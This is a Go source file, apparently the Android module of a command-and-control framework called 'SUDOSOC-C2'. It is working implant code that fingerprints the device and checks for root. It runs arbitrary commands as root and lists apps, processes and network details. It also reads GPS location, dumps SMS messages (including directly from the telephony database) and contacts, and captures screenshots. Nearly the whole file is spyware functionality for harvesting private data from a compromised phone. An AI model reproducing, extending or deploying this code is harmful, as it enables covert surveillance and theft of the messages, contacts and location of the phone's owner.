// //go:build android

package android

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  sudosoc — Seif

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.
*/

import (
	"bufio"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
)

// DeviceInfo holds Android device details
type DeviceInfo struct {
	Manufacturer string
	Model        string
	AndroidVer   string
	SDKVersion   string
	Hostname     string
	Username     string
	Arch         string
	IsRooted     bool
	BuildID      string
	Fingerprint  string
	SerialNumber string
}

// GetDeviceInfo collects Android device information via /system/build.prop and system calls
func GetDeviceInfo() *DeviceInfo {
	info := &DeviceInfo{
		Arch:     runtime.GOARCH,
		IsRooted: checkRoot(),
	}

	props := readBuildProps()

	info.Manufacturer = props["ro.product.manufacturer"]
	if info.Manufacturer == "" {
		info.Manufacturer = props["ro.product.brand"]
	}
	info.Model = props["ro.product.model"]
	info.AndroidVer = props["ro.build.version.release"]
	info.SDKVersion = props["ro.build.version.sdk"]
	info.BuildID = props["ro.build.id"]
	info.Fingerprint = props["ro.build.fingerprint"]
	info.SerialNumber = getSerial()

	if h, err := os.Hostname(); err == nil {
		info.Hostname = h
	}
	if u := os.Getenv("USER"); u != "" {
		info.Username = u
	} else {
		info.Username = "shell"
	}

	return info
}

// readBuildProps parses /system/build.prop key=value pairs
func readBuildProps() map[string]string {
	props := make(map[string]string)
	paths := []string{
		"/system/build.prop",
		"/vendor/build.prop",
		"/product/build.prop",
	}
	for _, p := range paths {
		f, err := os.Open(p)
		if err != nil {
			continue
		}
		scanner := bufio.NewScanner(f)
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if strings.HasPrefix(line, "#") || line == "" {
				continue
			}
			parts := strings.SplitN(line, "=", 2)
			if len(parts) == 2 {
				props[strings.TrimSpace(parts[0])] = strings.TrimSpace(parts[1])
			}
		}
		f.Close()
	}
	return props
}

// checkRoot returns true if the device is rooted (su binary present and executable)
func checkRoot() bool {
	suPaths := []string{
		"/system/bin/su",
		"/system/xbin/su",
		"/sbin/su",
		"/su/bin/su",
		"/magisk/.core/bin/su",
		"/data/local/su",
		"/data/local/xbin/su",
		"/data/local/bin/su",
	}
	for _, p := range suPaths {
		if info, err := os.Stat(p); err == nil && !info.IsDir() {
			return true
		}
	}
	// Try to actually run su
	cmd := exec.Command("su", "-c", "id")
	if err := cmd.Run(); err == nil {
		return true
	}
	return false
}

// getSerial attempts to read device serial number
func getSerial() string {
	// Try reading from sysfs
	paths := []string{
		"/sys/class/android_usb/android0/iSerial",
		"/proc/cmdline",
	}
	for _, p := range paths {
		if data, err := os.ReadFile(p); err == nil {
			s := strings.TrimSpace(string(data))
			if s != "" && len(s) < 64 {
				return s
			}
		}
	}
	return "unknown"
}

// ListInstalledApps returns a list of installed APK packages
// Reads from /data/app and the package manager database
func ListInstalledApps() []AppInfo {
	apps := []AppInfo{}

	// Try pm list packages command
	out, err := exec.Command("pm", "list", "packages", "-f").Output()
	if err == nil {
		lines := strings.Split(string(out), "\n")
		for _, line := range lines {
			line = strings.TrimSpace(line)
			if !strings.HasPrefix(line, "package:") {
				continue
			}
			// Format: package:/path/to/apk=com.package.name
			line = strings.TrimPrefix(line, "package:")
			parts := strings.SplitN(line, "=", 2)
			if len(parts) == 2 {
				apps = append(apps, AppInfo{
					PackageName: parts[1],
					APKPath:     parts[0],
				})
			}
		}
		return apps
	}

	// Fallback: scan /data/app directory
	apkDirs := []string{"/data/app", "/system/app", "/system/priv-app"}
	for _, dir := range apkDirs {
		_ = filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
			if err != nil {
				return nil
			}
			if strings.HasSuffix(path, ".apk") {
				apps = append(apps, AppInfo{
					PackageName: filepath.Base(filepath.Dir(path)),
					APKPath:     path,
				})
			}
			return nil
		})
	}
	return apps
}

// AppInfo holds information about an installed Android app
type AppInfo struct {
	PackageName string
	APKPath     string
}

// GetNetworkInterfaces returns network interface information on Android
func GetNetworkInterfaces() string {
	// Read from /proc/net/if_inet6 and /proc/net/fib_trie
	var sb strings.Builder

	// ip addr command
	if out, err := exec.Command("ip", "addr", "show").Output(); err == nil {
		sb.Write(out)
		return sb.String()
	}

	// ifconfig fallback
	if out, err := exec.Command("ifconfig").Output(); err == nil {
		sb.Write(out)
		return sb.String()
	}

	// Manual read from /proc/net/dev
	if f, err := os.Open("/proc/net/dev"); err == nil {
		defer f.Close()
		scanner := bufio.NewScanner(f)
		for scanner.Scan() {
			sb.WriteString(scanner.Text() + "\n")
		}
	}
	return sb.String()
}

// GetWifiInfo returns WiFi connection details
func GetWifiInfo() string {
	var sb strings.Builder

	// Read WiFi state from sys
	wifiPaths := []string{
		"/sys/class/net/wlan0/address",
		"/sys/class/net/wlan0/operstate",
	}
	for _, p := range wifiPaths {
		if data, err := os.ReadFile(p); err == nil {
			sb.WriteString(fmt.Sprintf("%s: %s\n", filepath.Base(p), strings.TrimSpace(string(data))))
		}
	}

	// Try getprop for WiFi SSID
	if out, err := exec.Command("getprop", "wifi.interface").Output(); err == nil {
		sb.WriteString(fmt.Sprintf("wifi.interface: %s\n", strings.TrimSpace(string(out))))
	}

	return sb.String()
}

// GetStorageInfo returns storage information
func GetStorageInfo() string {
	out, err := exec.Command("df", "-h").Output()
	if err != nil {
		return "storage info unavailable"
	}
	return string(out)
}

// GetRunningProcesses returns running processes on Android
func GetRunningProcesses() string {
	out, err := exec.Command("ps", "-A").Output()
	if err != nil {
		// Fallback for older Android
		out, err = exec.Command("ps").Output()
		if err != nil {
			return "process list unavailable"
		}
	}
	return string(out)
}

// ExecAsRoot attempts to run a command with root privileges using su
func ExecAsRoot(command string) (string, error) {
	if !checkRoot() {
		return "", fmt.Errorf("device is not rooted")
	}
	out, err := exec.Command("su", "-c", command).CombinedOutput()
	return string(out), err
}

// GetBatteryInfo returns battery level and status
func GetBatteryInfo() string {
	var sb strings.Builder
	batteryPaths := []string{
		"/sys/class/power_supply/battery/capacity",
		"/sys/class/power_supply/battery/status",
		"/sys/class/power_supply/battery/temp",
	}
	for _, p := range batteryPaths {
		if data, err := os.ReadFile(p); err == nil {
			sb.WriteString(fmt.Sprintf("%s: %s\n", filepath.Base(p), strings.TrimSpace(string(data))))
		}
	}
	return sb.String()
}

// GetLocationFromGPS attempts to get location from GPS provider
// Requires location permission — reads from /dev/gps or via locationd
func GetLocationFromGPS() string {
	// Try reading from common location paths
	locationFiles := []string{
		"/data/misc/location/gps/gps.conf",
	}
	for _, f := range locationFiles {
		if data, err := os.ReadFile(f); err == nil {
			return string(data)
		}
	}
	// Try dumpsys
	if out, err := exec.Command("dumpsys", "location").Output(); err == nil {
		lines := strings.Split(string(out), "\n")
		for _, line := range lines {
			if strings.Contains(line, "Last Known") || strings.Contains(line, "lat=") || strings.Contains(line, "lng=") {
				return line
			}
		}
	}
	return "location unavailable (requires root or permission)"
}

// DumpSMS reads SMS messages from the SMS content provider database
// Requires root on Android 10+
func DumpSMS() string {
	// Try content provider query
	out, err := exec.Command("content", "query", "--uri", "content://sms/inbox", "--projection", "address,body,date").Output()
	if err == nil {
		return string(out)
	}
	// Root path: read SQLite DB directly
	dbPaths := []string{
		"/data/data/com.android.providers.telephony/databases/mmssms.db",
		"/data/user_de/0/com.android.providers.telephony/databases/mmssms.db",
	}
	for _, p := range dbPaths {
		if _, err := os.Stat(p); err == nil {
			out, err := exec.Command("sqlite3", p, "SELECT address, body, datetime(date/1000,'unixepoch') FROM sms ORDER BY date DESC LIMIT 100;").Output()
			if err == nil {
				return string(out)
			}
		}
	}
	return "SMS dump requires root access"
}

// DumpContacts reads contacts from the contacts content provider
func DumpContacts() string {
	out, err := exec.Command("content", "query",
		"--uri", "content://contacts/phones",
		"--projection", "display_name,number").Output()
	if err == nil {
		return string(out)
	}
	return "contacts dump requires shell/root access"
}

// Screenshot captures the screen using Android screencap utility
func Screenshot() ([]byte, error) {
	tmpFile := "/data/local/tmp/sudosoc_sc.png"
	_, err := exec.Command("screencap", "-p", tmpFile).Output()
	if err != nil {
		return nil, fmt.Errorf("screencap failed: %v", err)
	}
	data, err := os.ReadFile(tmpFile)
	if err != nil {
		return nil, err
	}
	_ = os.Remove(tmpFile)
	return data, nil
}
